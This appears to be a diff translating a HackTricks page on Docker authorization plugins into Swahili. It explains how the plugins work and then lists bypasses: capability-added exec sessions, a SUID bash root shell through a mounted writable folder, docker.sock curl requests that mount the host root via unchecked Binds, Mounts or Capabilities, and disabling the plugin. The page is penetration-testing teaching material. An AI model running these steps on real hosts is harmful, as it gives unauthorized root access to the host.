@@ -1,75 +1,70 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Docker’s** out-of-the-box **authorization** model is **all or nothing**. Any user with permission to access the Docker daemon can **run any** Docker client **command**. The same is true for callers using Docker’s Engine API to contact the daemon. If you require **greater access control**, you can create **authorization plugins** and add them to your Docker daemon configuration. Using an authorization plugin, a Docker administrator can **configure granular access** policies for managing access to the Docker daemon.
+**Mfano wa** **idhini** wa **Docker** ni **kila kitu au hakuna**. Mtumiaji yeyote mwenye ruhusa ya kufikia **Docker daemon** anaweza **kufanya amri** yoyote ya mteja wa Docker. Hali hiyo hiyo inatumika kwa wito wanaotumia **Docker Engine API** kuwasiliana na daemon. Ikiwa unahitaji **udhibiti wa ufikiaji** zaidi, unaweza kuunda **vijitendo vya idhini** na kuviweka kwenye usanidi wa **Docker daemon** yako. Kwa kutumia kijitendo cha idhini, msimamizi wa Docker anaweza **kuunda sera za ufikiaji** za kina kwa ajili ya kusimamia ufikiaji wa **Docker daemon**.
 
-# Basic architecture
+# Msingi wa usanifu
 
-Docker Auth plugins are **external** **plugins** you can use to **allow/deny** **actions** requested to the Docker Daemon **depending** on the **user** that requested it and the **action** **requested**.
+Vijitendo vya Docker Auth ni **vijitendo vya nje** ambavyo unaweza kutumia **kuruhusu/kukataa** **vitendo** vinavyotakiwa kwa **Docker Daemon** **kulingana** na **mtumiaji** aliyeomba na **kitendo** **kilichotakiwa**.
 
-**[The following info is from the docs](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Taarifa ifuatayo ni kutoka kwa nyaraka](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-When an **HTTP** **request** is made to the Docker **daemon** through the CLI or via the Engine API, the **authentication** **subsystem** **passes** the request to the installed **authentication** **plugin**(s). The request contains the user (caller) and command context. The **plugin** is responsible for deciding whether to **allow** or **deny** the request.
+Wakati **ombile** la **HTTP** linapotolewa kwa **daemon** ya Docker kupitia CLI au kupitia **Engine API**, **safu ya uthibitishaji** **inasafirisha** ombi kwa **kijitendo** cha **uthibitishaji** kilichosakinishwa. Ombi lina mtumiaji (mwanakitu) na muktadha wa amri. **Kijitendo** kina jukumu la kuamua ikiwa **kuruhusu** au **kukataa** ombi.
 
-The sequence diagrams below depict an allow and deny authorization flow:
+Mchoro wa mfuatano hapa chini unaonyesha mtiririko wa idhini ya kuruhusu na kukataa:
 
 ![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)
 
-Each request sent to the plugin **includes the authenticated user, the HTTP headers, and the request/response body**. Only the **user name** and the **authentication method** used are passed to the plugin. Most importantly, **no** user **credentials** or tokens are passed. Finally, **not all request/response bodies are sent** to the authorization plugin. Only those request/response bodies where the `Content-Type` is either `text/*` or `application/json` are sent.
+Kila ombi lililotumwa kwa kijitendo **linajumuisha mtumiaji aliyeidhinishwa, vichwa vya HTTP, na mwili wa ombi/jibu**. Ni **jina la mtumiaji** na **mbinu ya uthibitishaji** iliyotumika pekee ndizo zinazosafirishwa kwa kijitendo. Muhimu zaidi, **hakuna** akidi za mtumiaji au token zinazotumwa. Hatimaye, **sio kila mwili wa ombi/jibu unatumwa** kwa kijitendo cha idhini. Ni wale tu mwili wa ombi/jibu ambapo `Content-Type` ni `text/*` au `application/json` ndio unatumwa.
 
-For commands that can potentially hijack the HTTP connection (`HTTP Upgrade`), such as `exec`, the authorization plugin is only called for the initial HTTP requests. Once the plugin approves the command, authorization is not applied to the rest of the flow. Specifically, the streaming data is not passed to the authorization plugins. For commands that return chunked HTTP response, such as `logs` and `events`, only the HTTP request is sent to the authorization plugins.
+Kwa amri ambazo zinaweza kuweza kuingilia muunganisho wa HTTP (`HTTP Upgrade`), kama vile `exec`, kijitendo cha idhini kinaitwa tu kwa ombi la awali la HTTP. Mara kijitendo kinapokubali amri, idhini haitumiki kwa mtiririko wa mabaki. Kwa hakika, data ya mtiririko haitasafirishwa kwa vijitendo vya idhini. Kwa amri ambazo zinarejesha jibu la HTTP lililokatwa, kama vile `logs` na `events`, ni ombi la HTTP pekee ndilo linalotumwa kwa vijitendo vya idhini.
 
-During request/response processing, some authorization flows might need to do additional queries to the Docker daemon. To complete such flows, plugins can call the daemon API similar to a regular user. To enable these additional queries, the plugin must provide the means for an administrator to configure proper authentication and security policies.
+Wakati wa usindikaji wa ombi/jibu, baadhi ya mtiririko wa idhini yanaweza kuhitaji kufanya maswali ya ziada kwa **Docker daemon**. Ili kukamilisha mtiririko kama huo, vijitendo vinaweza kuita API ya daemon kama mtumiaji wa kawaida. Ili kuwezesha maswali haya ya ziada, kijitendo lazima kitoe njia kwa msimamizi kuunda sera sahihi za uthibitishaji na usalama.
 
-## Several Plugins
+## Vijitendo Vingi
 
-You are responsible for **registering** your **plugin** as part of the Docker daemon **startup**. You can install **multiple plugins and chain them together**. This chain can be ordered. Each request to the daemon passes in order through the chain. Only when **all the plugins grant access** to the resource, is the access granted.
+Unawajibika kwa **kujiandikisha** kijitendo chako kama sehemu ya **kuanzisha** **Docker daemon**. Unaweza kusakinisha **vijitendo vingi na kuviunganisha pamoja**. Mnyororo huu unaweza kuagizwa. Kila ombi kwa daemon hupita kwa mpangilio kupitia mnyororo. Ni tu wakati **vijitendo vyote vinapokubali ufikiaji** wa rasilimali, ndipo ufikiaji unaruhusiwa.
 
-# Plugin Examples
+# Mifano ya Kijitendo
 
 ## Twistlock AuthZ Broker
 
-The plugin [**authz**](https://github.com/twistlock/authz) allows you to create a simple **JSON** file that the **plugin** will be **reading** to authorize the requests. Therefore, it gives you the opportunity to control very easily which API endpoints can reach each user.
+Kijitendo [**authz**](https://github.com/twistlock/authz) kinakuruhusu kuunda faili rahisi ya **JSON** ambayo **kijitendo** kitakuwa **kikisoma** ili kuidhinisha maombi. Hivyo, inakupa fursa ya kudhibiti kwa urahisi ni vipi **API endpoints** zinaweza kufikia kila mtumiaji.
 
-This is an example that will allow Alice and Bob can create new containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+Hii ni mfano ambao utaruhusu Alice na Bob kuunda kontena mpya: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-In the page [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) you can find the relation between the requested URL and the action. In the page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) you can find the relation between the action name and the action
+Katika ukurasa [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) unaweza kupata uhusiano kati ya URL iliyotakiwa na kitendo. Katika ukurasa [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) unaweza kupata uhusiano kati ya jina la kitendo na kitendo.
 
-## Simple Plugin Tutorial
+## Mwongozo wa Kijitendo Rahisi
 
-You can find an **easy to understand plugin** with detailed information about installation and debugging here: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
+Unaweza kupata **kijitendo rahisi kueleweka** chenye taarifa za kina kuhusu usakinishaji na urekebishaji hapa: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
-Read the `README` and the `plugin.go` code to understand how is it working.
+Soma `README` na msimbo wa `plugin.go` ili kuelewa jinsi inavyofanya kazi.
 
 # Docker Auth Plugin Bypass
 
-## Enumerate access
+## Kuorodhesha ufikiaji
 
-The main things to check are the **which endpoints are allowed** and **which values of HostConfig are allowed**.
+Mambo makuu ya kuangalia ni **ni vipi endpoints zinazoruhusiwa** na **ni vipi thamani za HostConfig zinazoruhusiwa**.
 
-To perform this enumeration you can **use the tool** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
+Ili kufanya kuorodhesha hii unaweza **kutumia chombo** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
 
-## disallowed `run --privileged`
+## kukataa `run --privileged`
 
-### Minimum Privileges
-
+### Haki za chini
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
+### Kukimbia kontena na kisha kupata kikao chenye mamlaka
 
-### Running a container and then getting a privileged session
-
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+Katika kesi hii, sysadmin **alipiga marufuku watumiaji kuunganisha volumu na kukimbia kontena kwa bendera `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+Hata hivyo, mtumiaji anaweza **kuunda shell ndani ya kontena linalotembea na kutoa haki za ziada**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -81,42 +76,38 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-
-Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.
+Sasa, mtumiaji anaweza kutoroka kutoka kwenye kontena akitumia yoyote ya [**mbinu zilizozungumziwa hapo awali**](./#privileged-flag) na **kuinua mamlaka** ndani ya mwenyeji.
 
 ## Mount Writable Folder
 
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+Katika kesi hii, sysadmin **amezuia watumiaji kuendesha kontena na bendera ya `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena, na aliruhusu tu kuunganisha folda ya `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
 host> /tmp/bash
- -p #This will give you a shell as root
+-p #This will give you a shell as root
 ```
-
 > [!NOTE]
-> Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+> Kumbuka kwamba huenda usiweze kuunganisha folda `/tmp` lakini unaweza kuunganisha **folda nyingine inayoweza kuandikwa**. Unaweza kupata directories zinazoweza kuandikwa kwa kutumia: `find / -writable -type d 2>/dev/null`
 >
-> **Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+> **Kumbuka kwamba si directories zote katika mashine ya linux zitasaidia suid bit!** Ili kuangalia ni directories zipi zinasaidia suid bit, endesha `mount | grep -v "nosuid"` Kwa mfano kawaida `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` na `/var/lib/lxcfs` hazisaidii suid bit.
 >
-> Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+> Kumbuka pia kwamba ikiwa unaweza **kuunganisha `/etc`** au folda nyingine yoyote **iliyokuwa na faili za usanidi**, unaweza kuzibadilisha kutoka kwenye kontena la docker kama root ili **uzitumie kwenye mwenyeji** na kupandisha mamlaka (huenda ukibadilisha `/etc/shadow`)
 
 ## Unchecked API Endpoint
 
-The responsibility of the sysadmin configuring this plugin would be to control which actions and with which privileges each user can perform. Therefore, if the admin takes a **blacklist** approach with the endpoints and the attributes he might **forget some of them** that could allow an attacker to **escalate privileges.**
+Wajibu wa sysadmin anayekonfigu plugin hii utakuwa kudhibiti ni vitendo vipi na kwa mamlaka zipi kila mtumiaji anaweza kufanya. Hivyo, ikiwa admin atachukua njia ya **blacklist** na endpoints na sifa zake huenda **akasahau baadhi yao** ambazo zinaweza kumruhusu mshambuliaji **kupandisha mamlaka.**
 
-You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Unaweza kuangalia docker API katika [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
 ## Unchecked JSON Structure
 
 ### Binds in root
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
-In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
+Inawezekana kwamba wakati sysadmin alikamilisha moto wa docker alikosa **kigezo muhimu** cha [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Binds**".\
+Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena linalounganisha folda ya mzizi (/) ya mwenyeji:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -126,38 +117,30 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
-
 > [!WARNING]
-> Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
+> Kumbuka jinsi katika mfano huu tunatumia **`Binds`** kama ufunguo wa kiwango cha juu katika JSON lakini katika API inaonekana chini ya ufunguo **`HostConfig`**
 
-### Binds in HostConfig
+### Binds katika HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Fuata maelekezo sawa na **Binds katika root** ukifanya **ombile** kwa Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-
 ### Mounts in root
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Fuata maelekezo sawa na yale ya **Binds in root** ukifanya **ombile** hili kwa Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-
 ### Mounts in HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Fuata maelekezo sawa na **Binds in root** ukifanya **ombile** hili kwa Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-
 ## Unchecked JSON Attribute
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS_MODULE** capability:
-
+Inawezekana kwamba wakati sysadmin alipoandika moto wa docker alisahau kuhusu **sifa muhimu za parameter** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Capabilities**" ndani ya "**HostConfig**". Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena lenye uwezo wa **SYS_MODULE**:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -167,14 +150,12 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
-
 > [!NOTE]
-> The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
+> **`HostConfig`** ni ufunguo ambao kawaida unashikilia **privileges** **za kuvutia** za kutoroka kutoka kwenye kontena. Hata hivyo, kama tulivyozungumzia hapo awali, zingatia jinsi matumizi ya Binds nje yake pia yanavyofanya kazi na yanaweza kukuruhusu kupita vizuizi.
 
-## Disabling Plugin
+## Kuondoa Plugin
 
-If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!
-
+Ikiwa **sysadmin** **alipokosa** **kuzuia** uwezo wa **kuondoa** **plugin**, unaweza kutumia hii kufaidika na kuondoa kabisa!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -186,10 +167,9 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
+Kumbuka ku **re-enable plugin baada ya kupandisha**, au **kuanzisha tena huduma ya docker hakutafanya kazi**!
 
-Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
-
-## Auth Plugin Bypass writeups
+## Maktaba ya Bypass ya Plugin ya Auth
 
 - [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
